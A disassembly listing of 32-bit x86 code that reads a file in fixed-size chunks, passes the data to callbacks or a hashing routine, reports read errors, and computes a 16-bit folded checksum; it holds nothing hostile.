  40325b:	8d a8 cc 0c 00 00    	lea    0xccc(%eax),%ebp
  403261:	8b 00                	mov    (%eax),%eax
  403263:	51                   	push   %ecx
  403264:	50                   	push   %eax
  403265:	89 44 24 24          	mov    %eax,0x24(%esp)
  403269:	ff 15 94 80 41 00    	call   *0x418094
  40326f:	85 c0                	test   %eax,%eax
  403271:	75 23                	jne    0x403296
  403273:	68 bc aa 41 00       	push   $0x41aabc
  403278:	68 1e 01 00 00       	push   $0x11e
  40327d:	68 70 aa 41 00       	push   $0x41aa70
  403282:	33 d2                	xor    %edx,%edx
  403284:	e8 87 2f 00 00       	call   0x406210
  403289:	83 c4 0c             	add    $0xc,%esp
  40328c:	33 c0                	xor    %eax,%eax
  40328e:	5f                   	pop    %edi
  40328f:	5e                   	pop    %esi
  403290:	5d                   	pop    %ebp
  403291:	5b                   	pop    %ebx
  403292:	83 c4 18             	add    $0x18,%esp
  403295:	c3                   	ret
  403296:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  40329a:	33 c0                	xor    %eax,%eax
  40329c:	83 c1 08             	add    $0x8,%ecx
  40329f:	33 ff                	xor    %edi,%edi
  4032a1:	33 db                	xor    %ebx,%ebx
  4032a3:	3b 44 24 30          	cmp    0x30(%esp),%eax
  4032a7:	89 44 24 20          	mov    %eax,0x20(%esp)
  4032ab:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  4032af:	75 0d                	jne    0x4032be
  4032b1:	8b 54 24 44          	mov    0x44(%esp),%edx
  4032b5:	8b 32                	mov    (%edx),%esi
  4032b7:	8b c2                	mov    %edx,%eax
  4032b9:	8b 40 04             	mov    0x4(%eax),%eax
  4032bc:	eb 06                	jmp    0x4032c4
  4032be:	8b 71 f8             	mov    -0x8(%ecx),%esi
  4032c1:	8b 41 fc             	mov    -0x4(%ecx),%eax
  4032c4:	2b f7                	sub    %edi,%esi
  4032c6:	1b c3                	sbb    %ebx,%eax
  4032c8:	8b d6                	mov    %esi,%edx
  4032ca:	0f ac c2 0f          	shrd   $0xf,%eax,%edx
  4032ce:	c1 e8 0f             	shr    $0xf,%eax
  4032d1:	81 e6 ff 7f 00 00    	and    $0x7fff,%esi
  4032d7:	89 54 24 18          	mov    %edx,0x18(%esp)
  4032db:	75 07                	jne    0x4032e4
  4032dd:	be 00 80 00 00       	mov    $0x8000,%esi
  4032e2:	eb 05                	jmp    0x4032e9
  4032e4:	42                   	inc    %edx
  4032e5:	89 54 24 18          	mov    %edx,0x18(%esp)
  4032e9:	85 d2                	test   %edx,%edx
  4032eb:	0f 86 8a 00 00 00    	jbe    0x40337b
  4032f1:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4032f5:	6a 00                	push   $0x0
  4032f7:	6a 00                	push   $0x0
  4032f9:	53                   	push   %ebx
  4032fa:	57                   	push   %edi
  4032fb:	51                   	push   %ecx
  4032fc:	ff 15 88 80 41 00    	call   *0x418088
  403302:	85 c0                	test   %eax,%eax
  403304:	0f 84 51 01 00 00    	je     0x40345b
  40330a:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40330e:	6a 00                	push   $0x0
  403310:	8d 54 24 28          	lea    0x28(%esp),%edx
  403314:	52                   	push   %edx
  403315:	56                   	push   %esi
  403316:	55                   	push   %ebp
  403317:	50                   	push   %eax
  403318:	ff 15 90 80 41 00    	call   *0x418090
  40331e:	85 c0                	test   %eax,%eax
  403320:	0f 84 58 01 00 00    	je     0x40347e
  403326:	3b 74 24 24          	cmp    0x24(%esp),%esi
  40332a:	0f 85 71 01 00 00    	jne    0x4034a1
  403330:	8b 44 24 34          	mov    0x34(%esp),%eax
  403334:	85 c0                	test   %eax,%eax
  403336:	74 11                	je     0x403349
  403338:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  40333c:	56                   	push   %esi
  40333d:	55                   	push   %ebp
  40333e:	51                   	push   %ecx
  40333f:	ff d0                	call   *%eax
  403341:	85 c0                	test   %eax,%eax
  403343:	0f 84 7e 01 00 00    	je     0x4034c7
  403349:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  40334d:	85 c0                	test   %eax,%eax
  40334f:	74 11                	je     0x403362
  403351:	8b 54 24 40          	mov    0x40(%esp),%edx
  403355:	56                   	push   %esi
  403356:	55                   	push   %ebp
  403357:	52                   	push   %edx
  403358:	ff d0                	call   *%eax
  40335a:	85 c0                	test   %eax,%eax
  40335c:	0f 84 71 01 00 00    	je     0x4034d3
  403362:	03 fe                	add    %esi,%edi
  403364:	83 d3 00             	adc    $0x0,%ebx
  403367:	83 6c 24 18 01       	subl   $0x1,0x18(%esp)
  40336c:	be 00 80 00 00       	mov    $0x8000,%esi
  403371:	0f 85 7a ff ff ff    	jne    0x4032f1
  403377:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40337b:	8b 44 24 20          	mov    0x20(%esp),%eax
  40337f:	3b 44 24 30          	cmp    0x30(%esp),%eax
  403383:	0f 83 af 00 00 00    	jae    0x403438
  403389:	8b 31                	mov    (%ecx),%esi
  40338b:	85 f6                	test   %esi,%esi
  40338d:	0f 84 bb 00 00 00    	je     0x40344e
  403393:	83 79 08 00          	cmpl   $0x0,0x8(%ecx)
  403397:	75 4d                	jne    0x4033e6
  403399:	6a 00                	push   $0x0
  40339b:	6a 00                	push   $0x0
  40339d:	53                   	push   %ebx
  40339e:	57                   	push   %edi
  40339f:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  4033a3:	57                   	push   %edi
  4033a4:	ff 15 88 80 41 00    	call   *0x418088
  4033aa:	85 c0                	test   %eax,%eax
  4033ac:	0f 84 a9 00 00 00    	je     0x40345b
  4033b2:	8b cd                	mov    %ebp,%ecx
  4033b4:	8b d7                	mov    %edi,%edx
  4033b6:	e8 95 f3 ff ff       	call   0x402750
  4033bb:	85 c0                	test   %eax,%eax
  4033bd:	0f 84 6a 01 00 00    	je     0x40352d
  4033c3:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4033c7:	85 c0                	test   %eax,%eax
  4033c9:	74 17                	je     0x4033e2
  4033cb:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4033cf:	8b 11                	mov    (%ecx),%edx
  4033d1:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  4033d5:	52                   	push   %edx
  4033d6:	55                   	push   %ebp
  4033d7:	51                   	push   %ecx
  4033d8:	ff d0                	call   *%eax
  4033da:	85 c0                	test   %eax,%eax
  4033dc:	0f 84 fd 00 00 00    	je     0x4034df
  4033e2:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4033e6:	8b 74 24 34          	mov    0x34(%esp),%esi
  4033ea:	85 f6                	test   %esi,%esi
  4033ec:	74 3a                	je     0x403428
  4033ee:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  4033f2:	74 34                	je     0x403428
  4033f4:	8b 01                	mov    (%ecx),%eax
  4033f6:	3d 00 80 00 00       	cmp    $0x8000,%eax
  4033fb:	0f 87 ea 00 00 00    	ja     0x4034eb
  403401:	50                   	push   %eax
  403402:	6a 00                	push   $0x0
  403404:	55                   	push   %ebp
  403405:	e8 86 5b 00 00       	call   0x408f90
  40340a:	8b 54 24 20          	mov    0x20(%esp),%edx
  40340e:	8b 02                	mov    (%edx),%eax
  403410:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  403414:	83 c4 0c             	add    $0xc,%esp
  403417:	50                   	push   %eax
  403418:	55                   	push   %ebp
  403419:	51                   	push   %ecx
  40341a:	ff d6                	call   *%esi
  40341c:	85 c0                	test   %eax,%eax
  40341e:	0f 84 ed 00 00 00    	je     0x403511
  403424:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403428:	8b 39                	mov    (%ecx),%edi
  40342a:	8b 59 fc             	mov    -0x4(%ecx),%ebx
  40342d:	8b 44 24 20          	mov    0x20(%esp),%eax
  403431:	33 d2                	xor    %edx,%edx
  403433:	03 79 f8             	add    -0x8(%ecx),%edi
  403436:	13 da                	adc    %edx,%ebx
  403438:	40                   	inc    %eax
  403439:	83 c1 18             	add    $0x18,%ecx
  40343c:	89 44 24 20          	mov    %eax,0x20(%esp)
  403440:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  403444:	3b 44 24 30          	cmp    0x30(%esp),%eax
  403448:	0f 86 61 fe ff ff    	jbe    0x4032af
  40344e:	b8 01 00 00 00       	mov    $0x1,%eax
  403453:	5f                   	pop    %edi
  403454:	5e                   	pop    %esi
  403455:	5d                   	pop    %ebp
  403456:	5b                   	pop    %ebx
  403457:	83 c4 18             	add    $0x18,%esp
  40345a:	c3                   	ret
  40345b:	68 44 aa 41 00       	push   $0x41aa44
  403460:	68 f9 00 00 00       	push   $0xf9
  403465:	68 70 aa 41 00       	push   $0x41aa70
  40346a:	33 d2                	xor    %edx,%edx
  40346c:	e8 9f 2d 00 00       	call   0x406210
  403471:	83 c4 0c             	add    $0xc,%esp
  403474:	33 c0                	xor    %eax,%eax
  403476:	5f                   	pop    %edi
  403477:	5e                   	pop    %esi
  403478:	5d                   	pop    %ebp
  403479:	5b                   	pop    %ebx
  40347a:	83 c4 18             	add    $0x18,%esp
  40347d:	c3                   	ret
  40347e:	68 90 aa 41 00       	push   $0x41aa90
  403483:	68 fc 00 00 00       	push   $0xfc
  403488:	68 70 aa 41 00       	push   $0x41aa70
  40348d:	33 d2                	xor    %edx,%edx
  40348f:	e8 7c 2d 00 00       	call   0x406210
  403494:	83 c4 0c             	add    $0xc,%esp
  403497:	33 c0                	xor    %eax,%eax
  403499:	5f                   	pop    %edi
  40349a:	5e                   	pop    %esi
  40349b:	5d                   	pop    %ebp
  40349c:	5b                   	pop    %ebx
  40349d:	83 c4 18             	add    $0x18,%esp
  4034a0:	c3                   	ret
  4034a1:	68 ac aa 41 00       	push   $0x41aaac
  4034a6:	68 fe 00 00 00       	push   $0xfe
  4034ab:	ba 01 00 00 00       	mov    $0x1,%edx
  4034b0:	68 70 aa 41 00       	push   $0x41aa70
  4034b5:	e8 86 2e 00 00       	call   0x406340
  4034ba:	83 c4 0c             	add    $0xc,%esp
  4034bd:	33 c0                	xor    %eax,%eax
  4034bf:	5f                   	pop    %edi
  4034c0:	5e                   	pop    %esi
  4034c1:	5d                   	pop    %ebp
  4034c2:	5b                   	pop    %ebx
  4034c3:	83 c4 18             	add    $0x18,%esp
  4034c6:	c3                   	ret
  4034c7:	68 6c ab 41 00       	push   $0x41ab6c
  4034cc:	68 74 03 00 00       	push   $0x374
  4034d1:	eb 48                	jmp    0x40351b
  4034d3:	68 6c ab 41 00       	push   $0x41ab6c
  4034d8:	68 79 03 00 00       	push   $0x379
  4034dd:	eb 3c                	jmp    0x40351b
  4034df:	68 6c ab 41 00       	push   $0x41ab6c
  4034e4:	68 8b 03 00 00       	push   $0x38b
  4034e9:	eb 30                	jmp    0x40351b
  4034eb:	68 7c ab 41 00       	push   $0x41ab7c
  4034f0:	68 92 03 00 00       	push   $0x392
  4034f5:	ba 08 00 00 00       	mov    $0x8,%edx
  4034fa:	68 70 aa 41 00       	push   $0x41aa70
  4034ff:	e8 3c 2e 00 00       	call   0x406340
  403504:	83 c4 0c             	add    $0xc,%esp
  403507:	33 c0                	xor    %eax,%eax
  403509:	5f                   	pop    %edi
  40350a:	5e                   	pop    %esi
  40350b:	5d                   	pop    %ebp
  40350c:	5b                   	pop    %ebx
  40350d:	83 c4 18             	add    $0x18,%esp
  403510:	c3                   	ret
  403511:	68 6c ab 41 00       	push   $0x41ab6c
  403516:	68 95 03 00 00       	push   $0x395
  40351b:	ba 11 00 00 00       	mov    $0x11,%edx
  403520:	68 70 aa 41 00       	push   $0x41aa70
  403525:	e8 16 2e 00 00       	call   0x406340
  40352a:	83 c4 0c             	add    $0xc,%esp
  40352d:	5f                   	pop    %edi
  40352e:	5e                   	pop    %esi
  40352f:	5d                   	pop    %ebp
  403530:	33 c0                	xor    %eax,%eax
  403532:	5b                   	pop    %ebx
  403533:	83 c4 18             	add    $0x18,%esp
  403536:	c3                   	ret
  403537:	cc                   	int3
  403538:	cc                   	int3
  403539:	cc                   	int3
  40353a:	cc                   	int3
  40353b:	cc                   	int3
  40353c:	cc                   	int3
  40353d:	cc                   	int3
  40353e:	cc                   	int3
  40353f:	cc                   	int3
  403540:	83 ec 24             	sub    $0x24,%esp
  403543:	53                   	push   %ebx
  403544:	55                   	push   %ebp
  403545:	8b 6c 24 38          	mov    0x38(%esp),%ebp
  403549:	56                   	push   %esi
  40354a:	8d 98 cc 0c 00 00    	lea    0xccc(%eax),%ebx
  403550:	8b 00                	mov    (%eax),%eax
  403552:	55                   	push   %ebp
  403553:	50                   	push   %eax
  403554:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  403558:	89 44 24 20          	mov    %eax,0x20(%esp)
  40355c:	ff 15 94 80 41 00    	call   *0x418094
  403562:	33 d2                	xor    %edx,%edx
  403564:	85 c0                	test   %eax,%eax
  403566:	75 20                	jne    0x403588
  403568:	68 bc aa 41 00       	push   $0x41aabc
  40356d:	68 1e 01 00 00       	push   $0x11e
  403572:	68 70 aa 41 00       	push   $0x41aa70
  403577:	e8 94 2c 00 00       	call   0x406210
  40357c:	83 c4 0c             	add    $0xc,%esp
  40357f:	33 c0                	xor    %eax,%eax
  403581:	5e                   	pop    %esi
  403582:	5d                   	pop    %ebp
  403583:	5b                   	pop    %ebx
  403584:	83 c4 24             	add    $0x24,%esp
  403587:	c3                   	ret
  403588:	8b 74 24 34          	mov    0x34(%esp),%esi
  40358c:	33 c9                	xor    %ecx,%ecx
  40358e:	83 c6 08             	add    $0x8,%esi
  403591:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  403595:	89 54 24 2c          	mov    %edx,0x2c(%esp)
  403599:	89 54 24 0c          	mov    %edx,0xc(%esp)
  40359d:	89 74 24 14          	mov    %esi,0x14(%esp)
  4035a1:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4035a5:	3b 44 24 38          	cmp    0x38(%esp),%eax
  4035a9:	75 0a                	jne    0x4035b5
  4035ab:	8b 45 00             	mov    0x0(%ebp),%eax
  4035ae:	2b c1                	sub    %ecx,%eax
  4035b0:	8b 4d 04             	mov    0x4(%ebp),%ecx
  4035b3:	eb 08                	jmp    0x4035bd
  4035b5:	8b 46 f8             	mov    -0x8(%esi),%eax
  4035b8:	2b c1                	sub    %ecx,%eax
  4035ba:	8b 4e fc             	mov    -0x4(%esi),%ecx
  4035bd:	1b ca                	sbb    %edx,%ecx
  4035bf:	8b d0                	mov    %eax,%edx
  4035c1:	0f ac ca 0f          	shrd   $0xf,%ecx,%edx
  4035c5:	c1 e9 0f             	shr    $0xf,%ecx
  4035c8:	25 ff 7f 00 00       	and    $0x7fff,%eax
  4035cd:	89 54 24 10          	mov    %edx,0x10(%esp)
  4035d1:	8b e8                	mov    %eax,%ebp
  4035d3:	75 07                	jne    0x4035dc
  4035d5:	bd 00 80 00 00       	mov    $0x8000,%ebp
  4035da:	eb 05                	jmp    0x4035e1
  4035dc:	42                   	inc    %edx
  4035dd:	89 54 24 10          	mov    %edx,0x10(%esp)
  4035e1:	85 d2                	test   %edx,%edx
  4035e3:	0f 86 a8 00 00 00    	jbe    0x403691
  4035e9:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  4035ed:	8b 54 24 28          	mov    0x28(%esp),%edx
  4035f1:	8b 44 24 18          	mov    0x18(%esp),%eax
  4035f5:	6a 00                	push   $0x0
  4035f7:	6a 00                	push   $0x0
  4035f9:	51                   	push   %ecx
  4035fa:	52                   	push   %edx
  4035fb:	50                   	push   %eax
  4035fc:	ff 15 88 80 41 00    	call   *0x418088
  403602:	85 c0                	test   %eax,%eax
  403604:	0f 84 12 01 00 00    	je     0x40371c
  40360a:	8b 54 24 18          	mov    0x18(%esp),%edx
  40360e:	6a 00                	push   $0x0
  403610:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  403614:	51                   	push   %ecx
  403615:	55                   	push   %ebp
  403616:	53                   	push   %ebx
  403617:	52                   	push   %edx
  403618:	ff 15 90 80 41 00    	call   *0x418090
  40361e:	85 c0                	test   %eax,%eax
  403620:	0f 84 18 01 00 00    	je     0x40373e
  403626:	3b 6c 24 20          	cmp    0x20(%esp),%ebp
  40362a:	0f 85 30 01 00 00    	jne    0x403760
  403630:	b8 10 1c 40 00       	mov    $0x401c10,%eax
  403635:	85 c0                	test   %eax,%eax
  403637:	74 3f                	je     0x403678
  403639:	8b 77 20             	mov    0x20(%edi),%esi
  40363c:	83 e6 3f             	and    $0x3f,%esi
  40363f:	8b c5                	mov    %ebp,%eax
  403641:	85 ed                	test   %ebp,%ebp
  403643:	76 2b                	jbe    0x403670
  403645:	8a 0b                	mov    (%ebx),%cl
  403647:	88 4c 37 28          	mov    %cl,0x28(%edi,%esi,1)
  40364b:	46                   	inc    %esi
  40364c:	43                   	inc    %ebx
  40364d:	83 47 20 01          	addl   $0x1,0x20(%edi)
  403651:	83 57 24 00          	adcl   $0x0,0x24(%edi)
  403655:	48                   	dec    %eax
  403656:	89 44 24 24          	mov    %eax,0x24(%esp)
  40365a:	83 fe 40             	cmp    $0x40,%esi
  40365d:	75 0d                	jne    0x40366c
  40365f:	8b d7                	mov    %edi,%edx
  403661:	33 f6                	xor    %esi,%esi
  403663:	e8 98 17 00 00       	call   0x404e00
  403668:	8b 44 24 24          	mov    0x24(%esp),%eax
  40366c:	85 c0                	test   %eax,%eax
  40366e:	77 d5                	ja     0x403645
  403670:	8b 74 24 14          	mov    0x14(%esp),%esi
  403674:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  403678:	01 6c 24 28          	add    %ebp,0x28(%esp)
  40367c:	bd 00 80 00 00       	mov    $0x8000,%ebp
  403681:	83 54 24 2c 00       	adcl   $0x0,0x2c(%esp)
  403686:	83 6c 24 10 01       	subl   $0x1,0x10(%esp)
  40368b:	0f 85 58 ff ff ff    	jne    0x4035e9
  403691:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403695:	3b 54 24 38          	cmp    0x38(%esp),%edx
  403699:	73 56                	jae    0x4036f1
  40369b:	8b 06                	mov    (%esi),%eax
  40369d:	85 c0                	test   %eax,%eax
  40369f:	0f 84 2a 01 00 00    	je     0x4037cf
  4036a5:	b9 10 1c 40 00       	mov    $0x401c10,%ecx
  4036aa:	85 c9                	test   %ecx,%ecx
  4036ac:	74 2f                	je     0x4036dd
  4036ae:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  4036b2:	74 29                	je     0x4036dd
  4036b4:	3d 00 80 00 00       	cmp    $0x8000,%eax
  4036b9:	0f 87 c6 00 00 00    	ja     0x403785
  4036bf:	50                   	push   %eax
  4036c0:	6a 00                	push   $0x0
  4036c2:	53                   	push   %ebx
  4036c3:	e8 c8 58 00 00       	call   0x408f90
  4036c8:	8b 16                	mov    (%esi),%edx
  4036ca:	83 c4 0c             	add    $0xc,%esp
  4036cd:	52                   	push   %edx
  4036ce:	53                   	push   %ebx
  4036cf:	57                   	push   %edi
  4036d0:	e8 3b e5 ff ff       	call   0x401c10
  4036d5:	85 c0                	test   %eax,%eax
  4036d7:	0f 84 cd 00 00 00    	je     0x4037aa
  4036dd:	8b 06                	mov    (%esi),%eax
  4036df:	33 c9                	xor    %ecx,%ecx
  4036e1:	03 46 f8             	add    -0x8(%esi),%eax
  4036e4:	89 44 24 28          	mov    %eax,0x28(%esp)
  4036e8:	8b 46 fc             	mov    -0x4(%esi),%eax
  4036eb:	13 c1                	adc    %ecx,%eax
  4036ed:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  4036f1:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4036f5:	40                   	inc    %eax
  4036f6:	83 c6 18             	add    $0x18,%esi
  4036f9:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4036fd:	89 74 24 14          	mov    %esi,0x14(%esp)
  403701:	3b 44 24 38          	cmp    0x38(%esp),%eax
  403705:	0f 87 c4 00 00 00    	ja     0x4037cf
  40370b:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  40370f:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  403713:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  403717:	e9 85 fe ff ff       	jmp    0x4035a1
  40371c:	68 44 aa 41 00       	push   $0x41aa44
  403721:	68 f9 00 00 00       	push   $0xf9
  403726:	68 70 aa 41 00       	push   $0x41aa70
  40372b:	33 d2                	xor    %edx,%edx
  40372d:	e8 de 2a 00 00       	call   0x406210
  403732:	83 c4 0c             	add    $0xc,%esp
  403735:	33 c0                	xor    %eax,%eax
  403737:	5e                   	pop    %esi
  403738:	5d                   	pop    %ebp
  403739:	5b                   	pop    %ebx
  40373a:	83 c4 24             	add    $0x24,%esp
  40373d:	c3                   	ret
  40373e:	68 90 aa 41 00       	push   $0x41aa90
  403743:	68 fc 00 00 00       	push   $0xfc
  403748:	68 70 aa 41 00       	push   $0x41aa70
  40374d:	33 d2                	xor    %edx,%edx
  40374f:	e8 bc 2a 00 00       	call   0x406210
  403754:	83 c4 0c             	add    $0xc,%esp
  403757:	33 c0                	xor    %eax,%eax
  403759:	5e                   	pop    %esi
  40375a:	5d                   	pop    %ebp
  40375b:	5b                   	pop    %ebx
  40375c:	83 c4 24             	add    $0x24,%esp
  40375f:	c3                   	ret
  403760:	68 ac aa 41 00       	push   $0x41aaac
  403765:	68 fe 00 00 00       	push   $0xfe
  40376a:	ba 01 00 00 00       	mov    $0x1,%edx
  40376f:	68 70 aa 41 00       	push   $0x41aa70
  403774:	e8 c7 2b 00 00       	call   0x406340
  403779:	83 c4 0c             	add    $0xc,%esp
  40377c:	33 c0                	xor    %eax,%eax
  40377e:	5e                   	pop    %esi
  40377f:	5d                   	pop    %ebp
  403780:	5b                   	pop    %ebx
  403781:	83 c4 24             	add    $0x24,%esp
  403784:	c3                   	ret
  403785:	68 7c ab 41 00       	push   $0x41ab7c
  40378a:	68 d8 03 00 00       	push   $0x3d8
  40378f:	ba 08 00 00 00       	mov    $0x8,%edx
  403794:	68 70 aa 41 00       	push   $0x41aa70
  403799:	e8 a2 2b 00 00       	call   0x406340
  40379e:	83 c4 0c             	add    $0xc,%esp
  4037a1:	33 c0                	xor    %eax,%eax
  4037a3:	5e                   	pop    %esi
  4037a4:	5d                   	pop    %ebp
  4037a5:	5b                   	pop    %ebx
  4037a6:	83 c4 24             	add    $0x24,%esp
  4037a9:	c3                   	ret
  4037aa:	68 6c ab 41 00       	push   $0x41ab6c
  4037af:	68 db 03 00 00       	push   $0x3db
  4037b4:	ba 11 00 00 00       	mov    $0x11,%edx
  4037b9:	68 70 aa 41 00       	push   $0x41aa70
  4037be:	e8 7d 2b 00 00       	call   0x406340
  4037c3:	83 c4 0c             	add    $0xc,%esp
  4037c6:	33 c0                	xor    %eax,%eax
  4037c8:	5e                   	pop    %esi
  4037c9:	5d                   	pop    %ebp
  4037ca:	5b                   	pop    %ebx
  4037cb:	83 c4 24             	add    $0x24,%esp
  4037ce:	c3                   	ret
  4037cf:	5e                   	pop    %esi
  4037d0:	5d                   	pop    %ebp
  4037d1:	b8 01 00 00 00       	mov    $0x1,%eax
  4037d6:	5b                   	pop    %ebx
  4037d7:	83 c4 24             	add    $0x24,%esp
  4037da:	c3                   	ret
  4037db:	cc                   	int3
  4037dc:	cc                   	int3
  4037dd:	cc                   	int3
  4037de:	cc                   	int3
  4037df:	cc                   	int3
  4037e0:	55                   	push   %ebp
  4037e1:	8b ec                	mov    %esp,%ebp
  4037e3:	83 e4 f8             	and    $0xfffffff8,%esp
  4037e6:	83 ec 1c             	sub    $0x1c,%esp
  4037e9:	53                   	push   %ebx
  4037ea:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4037ed:	8b 53 04             	mov    0x4(%ebx),%edx
  4037f0:	8b 0b                	mov    (%ebx),%ecx
  4037f2:	56                   	push   %esi
  4037f3:	33 f6                	xor    %esi,%esi
  4037f5:	d1 e8                	shr    $1,%eax
  4037f7:	57                   	push   %edi
  4037f8:	89 54 24 24          	mov    %edx,0x24(%esp)
  4037fc:	33 ff                	xor    %edi,%edi
  4037fe:	33 d2                	xor    %edx,%edx
  403800:	83 f8 02             	cmp    $0x2,%eax
  403803:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  403807:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40380a:	89 74 24 18          	mov    %esi,0x18(%esp)
  40380e:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  403812:	89 44 24 10          	mov    %eax,0x10(%esp)
  403816:	7c 37                	jl     0x40384f
  403818:	83 c0 fe             	add    $0xfffffffe,%eax
  40381b:	d1 e8                	shr    $1,%eax
  40381d:	40                   	inc    %eax
  40381e:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403822:	03 c0                	add    %eax,%eax
  403824:	89 44 24 14          	mov    %eax,0x14(%esp)
  403828:	0f b7 01             	movzwl (%ecx),%eax
  40382b:	99                   	cltd
  40382c:	01 44 24 18          	add    %eax,0x18(%esp)
  403830:	0f b7 41 02          	movzwl 0x2(%ecx),%eax
  403834:	11 54 24 1c          	adc    %edx,0x1c(%esp)
  403838:	99                   	cltd
  403839:	03 f0                	add    %eax,%esi
  40383b:	13 fa                	adc    %edx,%edi
  40383d:	83 c1 04             	add    $0x4,%ecx
  403840:	83 6c 24 0c 01       	subl   $0x1,0xc(%esp)
  403845:	75 e1                	jne    0x403828
  403847:	8b 44 24 10          	mov    0x10(%esp),%eax
  40384b:	8b 54 24 14          	mov    0x14(%esp),%edx
  40384f:	3b d0                	cmp    %eax,%edx
  403851:	73 0c                	jae    0x40385f
  403853:	0f b7 01             	movzwl (%ecx),%eax
  403856:	99                   	cltd
  403857:	01 44 24 20          	add    %eax,0x20(%esp)
  40385b:	11 54 24 24          	adc    %edx,0x24(%esp)
  40385f:	03 74 24 18          	add    0x18(%esp),%esi
  403863:	13 7c 24 1c          	adc    0x1c(%esp),%edi
  403867:	03 74 24 20          	add    0x20(%esp),%esi
  40386b:	13 7c 24 24          	adc    0x24(%esp),%edi
  40386f:	89 33                	mov    %esi,(%ebx)
  403871:	89 7b 04             	mov    %edi,0x4(%ebx)
  403874:	5f                   	pop    %edi
  403875:	5e                   	pop    %esi
  403876:	5b                   	pop    %ebx
  403877:	8b e5                	mov    %ebp,%esp
  403879:	5d                   	pop    %ebp
  40387a:	c3                   	ret
  40387b:	cc                   	int3
  40387c:	cc                   	int3
  40387d:	cc                   	int3
  40387e:	cc                   	int3
  40387f:	cc                   	int3
  403880:	53                   	push   %ebx
  403881:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  403885:	56                   	push   %esi
  403886:	8b 74 24 10          	mov    0x10(%esp),%esi
  40388a:	57                   	push   %edi
  40388b:	8b 7c 24 18          	mov    0x18(%esp),%edi
  40388f:	8d 83 b8 00 00 00    	lea    0xb8(%ebx),%eax
  403895:	56                   	push   %esi
  403896:	50                   	push   %eax
  403897:	8b c7                	mov    %edi,%eax
  403899:	e8 42 ff ff ff       	call   0x4037e0
  40389e:	8b c7                	mov    %edi,%eax
  4038a0:	83 c4 08             	add    $0x8,%esp
  4038a3:	83 e0 01             	and    $0x1,%eax
  4038a6:	74 1b                	je     0x4038c3
  4038a8:	2b f0                	sub    %eax,%esi
  4038aa:	50                   	push   %eax
  4038ab:	8d 8b c0 00 00 00    	lea    0xc0(%ebx),%ecx
  4038b1:	03 f7                	add    %edi,%esi
  4038b3:	56                   	push   %esi
  4038b4:	51                   	push   %ecx
  4038b5:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  4038bb:	e8 90 63 00 00       	call   0x409c50
  4038c0:	83 c4 0c             	add    $0xc,%esp
  4038c3:	5f                   	pop    %edi
  4038c4:	5e                   	pop    %esi
  4038c5:	b8 01 00 00 00       	mov    $0x1,%eax
  4038ca:	5b                   	pop    %ebx
  4038cb:	c2 0c 00             	ret    $0xc
  4038ce:	cc                   	int3
  4038cf:	cc                   	int3
  4038d0:	83 ec 08             	sub    $0x8,%esp
  4038d3:	53                   	push   %ebx
  4038d4:	56                   	push   %esi
  4038d5:	8d b7 b8 00 00 00    	lea    0xb8(%edi),%esi
  4038db:	33 db                	xor    %ebx,%ebx
  4038dd:	39 5e 04             	cmp    %ebx,0x4(%esi)
  4038e0:	77 0e                	ja     0x4038f0
  4038e2:	81 3e ff ff 00 00    	cmpl   $0xffff,(%esi)
  4038e8:	76 3c                	jbe    0x403926
  4038ea:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  4038f0:	8d 44 24 08          	lea    0x8(%esp),%eax
  4038f4:	56                   	push   %esi
  4038f5:	50                   	push   %eax
  4038f6:	b8 08 00 00 00       	mov    $0x8,%eax
  4038fb:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4038ff:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  403903:	e8 d8 fe ff ff       	call   0x4037e0
  403908:	8b 54 24 14          	mov    0x14(%esp),%edx
  40390c:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403910:	83 c4 08             	add    $0x8,%esp
  403913:	89 0e                	mov    %ecx,(%esi)
  403915:	89 56 04             	mov    %edx,0x4(%esi)
  403918:	3b d3                	cmp    %ebx,%edx
  40391a:	77 d4                	ja     0x4038f0
  40391c:	72 08                	jb     0x403926
  40391e:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
  403924:	77 ca                	ja     0x4038f0
  403926:	8b 87 c0 00 00 00    	mov    0xc0(%edi),%eax
  40392c:	03 06                	add    (%esi),%eax
  40392e:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403932:	25 ff ff 00 00       	and    $0xffff,%eax
  403937:	03 01                	add    (%ecx),%eax
  403939:	5e                   	pop    %esi
  40393a:	5b                   	pop    %ebx
  40393b:	83 c4 08             	add    $0x8,%esp
